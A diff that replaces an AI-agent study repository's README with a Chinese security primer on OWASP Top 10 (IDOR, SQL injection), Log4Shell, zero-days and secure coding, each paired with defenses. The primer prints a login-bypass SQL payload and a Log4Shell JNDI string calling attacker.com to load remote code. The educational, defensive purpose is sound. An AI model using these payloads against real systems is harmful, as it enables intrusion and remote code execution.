@@ -1,30 +1,37 @@
-这是一个为期 6 周的 AI Agent 开发学习实战仓库。第一周重点攻克了 LLM API 调用、Function Calling、Prompt Engineering 以及 Pydantic 结构化输出。
+# 网络安全知识库 - 核心漏洞与防御
 
-## 📖 当前进度
-- [x] Day 1-2: Python异步编程 & OpenAI SDK 基础
-- [x] Day 3: Function Calling 实战 (计算器/天气/汇率工具)
-- [x] Day 4: Prompt Engineering (CoT, Few-shot, 意图路由Router, 语气解耦)
-- [x] Day 5: Pydantic 结构化输出 & 自我修正重试机制 (幻觉治理)
-- [x] Day 6: 工程化进阶 (Logging、Git分支管理、递归熔断、本地兜底计算)
+## OWASP Top 10 概述
+OWASP Top 10 是由开放 Web 应用程序安全项目（OWASP）发布的，关于 Web 应用程序最关键安全风险的权威排行榜。它每几年更新一次，是安全从业者的必修课。
+2021 版本中最主要的三大风险是：A01 失效的访问控制、A02 加密机制失效、A03 注入攻击。
 
-## 🏗️ 项目架构亮点
-- **Router 意图路由**：每次请求前动态注入专属 System Prompt，彻底隔离上下文污染。
-- **Pydantic 强类型校验**：拒绝模型随意输出，通过 `model_validate_json` 强约束 JSON 结构。
-- **自我修正重试 (Self-Correction)**：自动捕获 `ValidationError` 并把报错喂回给模型，进行反思重试。
-- **递归熔断与本地兜底**：7B 小模型“偷懒”不调用工具时，系统自动触发本地正则兜底计算，保证100%返回结果。
+## A01：失效的访问控制 (Broken Access Control)
+这是 2021 年的第一名。它指的是用户能够以非预期的权限执行操作。
+例如，攻击者可以通过修改 URL 中的 ID（如 `user_id=123` 改为 `user_id=124`），查看或修改其他用户的私密数据。这就是著名的 IDOR（不安全的直接对象引用）漏洞。
+防御建议：实施最小权限原则，使用基于角色的访问控制（RBAC），并在服务端进行严格的权限校验，绝对不要信任前端的任何权限声明。
 
-## 📂 文件说明
-- `03.py`: 主程序入口，命令行交互循环。
-- `tools_func.py`: 工具定义 (Schema)、本地函数执行、Agent 核心编排逻辑。
-- `models.py`: 定义了 MathReport, WeatherReport, SecurityReport 等 Pydantic 模型。
-- `prompts.py` & `router.py`: 提示词模板与意图路由逻辑。
-- `logger.py`: 标准化日志系统（控制台+文件分离）。
-- `知识总结.md`: Day 1-6 学习笔记与面试话术整理。
+## A03：注入攻击 (Injection)
+注入攻击（包括 SQL 注入、命令注入、LDAP 注入等）非常危险。
+以 SQL 注入（SQLi）为例：攻击者通过在输入框中插入恶意的 SQL 代码，欺骗后端数据库执行非预期的查询。
+例如，在登录框输入 `' OR '1'='1` 就可以绕过密码验证，直接进入系统。
+防御 SQL 注入的最佳实践是使用“参数化查询（Parameterized Queries）”，也叫“预编译语句”。绝对不要使用字符串拼接来构建 SQL 语句。
+除此之外，还应限制数据库账户的权限，遵循最小权限原则。
 
-## 🚀 快速开始
-1. 克隆项目: `git clone https://github.com/anyannan/ai-agent-learning.git`
-2. 安装依赖: `pip install -r requirements.txt`
-3. 在根目录创建 `.env` 文件并填入 API Key:
-   ```env
-   SILICONFLOW_API_KEY=你的Key
-   SILICONFLOW_BASE_URL=https://api.siliconflow.cn/v1
+## CVE-2021-44228：Log4j2 漏洞（Log4Shell）
+这是一个极其著名的 Java 远程代码执行（RCE）漏洞，影响极其广泛。
+该漏洞存在于 Apache Log4j2 这个 Java 日志记录库中。当程序将用户输入的数据记录到日志时，攻击者可以构造恶意的 JNDI 注入（如 `${jndi:ldap://attacker.com/a}`），触发远程加载恶意代码。
+防御措施：
+1. 升级 Log4j2 到 2.17.0 或更高版本。
+2. 在启动参数中设置 `-Dlog4j2.formatMsgNoLookups=true`。
+3. 部署 WAF（Web 应用防火墙）进行流量过滤。
+
+## 零日漏洞 (Zero-Day)
+零日漏洞是指已经被发现，但官方还没有发布补丁（尚未修复）的漏洞。攻击者可以利用零日漏洞发起“零日攻击”。
+由于没有官方修复，防御零日漏洞主要依赖：
+1. 虚拟补丁（WAF 规则拦截）。
+2. 威胁情报的快速响应。
+3. 严格的网络隔离和访问控制。
+
+## 安全编码原则
+1. 输入验证：永远不要信任用户的输入，所有输入必须进行严格的验证和转义。
+2. 输出编码：根据输出位置（HTML、JS、SQL），对输出内容进行适当的编码，防止 XSS 和注入。
+3. 纵深防御：不要只依赖单一的安全措施，应该在网络、主机、应用、数据等多个层面建立防线。
